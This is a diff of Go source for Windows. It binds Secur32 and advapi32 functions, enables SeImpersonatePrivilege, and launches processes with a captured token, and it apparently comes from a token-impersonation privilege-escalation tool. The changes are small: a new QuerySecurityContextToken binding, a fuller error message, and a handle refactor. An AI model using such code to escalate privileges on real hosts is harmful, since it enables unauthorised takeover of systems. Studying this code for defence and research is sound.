@@ -8,6 +8,26 @@ import (
 	"golang.org/x/sys/windows"
 )
 
+/*
+type (
+ BOOL          uint32
+ BOOLEAN       byte
+ BYTE          byte
+ DWORD         uint32
+ DWORD64       uint64
+ HANDLE        uintptr
+ HLOCAL        uintptr
+ LARGE_INTEGER int64
+ LONG          int32
+ LPVOID        uintptr
+ SIZE_T        uintptr
+ UINT          uint32
+ ULONG_PTR     uintptr
+ ULONGLONG     uint64
+ WORD          uint16
+)
+*/
+
 const (
 	SE_IMPERSONATE          = "SeImpersonatePrivilege"
 	SE_ASSIGN_PRIMARY_TOKEN = "SeAssignPrimaryToken"
@@ -31,9 +51,10 @@ var (
 	setSecurityDescriptorDacl    = advapi32DLL.NewProc("SetSecurityDescriptorDacl")
 	initializeSecurityDescriptor = advapi32DLL.NewProc("InitializeSecurityDescriptor")
 
-	secur32DLL               = syscall.NewLazyDLL("Secur32.dll")
-	acquireCredentialsHandle = secur32DLL.NewProc("AcquireCredentialsHandleW")
-	acceptSecurityContext    = secur32DLL.NewProc("AcceptSecurityContext")
+	secur32DLL                = syscall.NewLazyDLL("Secur32.dll")
+	acquireCredentialsHandle  = secur32DLL.NewProc("AcquireCredentialsHandleW")
+	acceptSecurityContext     = secur32DLL.NewProc("AcceptSecurityContext")
+	querySecurityContextToken = secur32DLL.NewProc("QuerySecurityContextToken")
 )
 
 type ITokenNegotiator interface {
@@ -54,7 +75,7 @@ func ExecuteWithToken(token windows.Token) error {
 		CREATE_NEW_CONSOLE, 0, 0, uintptr(unsafe.Pointer(&si)), uintptr(unsafe.Pointer(&pi)))
 
 	if err != syscall.Errno(0) {
-		fmt.Println("[!] CreateProcessWithTokenW failed, trying CreateProcessAsUser")
+		fmt.Println("[!] CreateProcessWithTokenW failed, trying CreateProcessAsUser ", err)
 		err := windows.CreateProcessAsUser(token, windows.StringToUTF16Ptr(program), windows.StringToUTF16Ptr(args), nil, nil, false, CREATE_NEW_CONSOLE, nil, nil, &si, &pi)
 
 		if err != nil {
@@ -77,12 +98,9 @@ func EnablePrivilege(securityEntity string) bool {
 		return false
 	}
 
-	handle, err := windows.GetCurrentProcess()
-	if err != nil {
-		return false
-	}
-
+	handle := windows.CurrentProcess()
 	err = windows.OpenProcessToken(handle, windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &token)
+
 	if err != nil {
 		return false
 	}
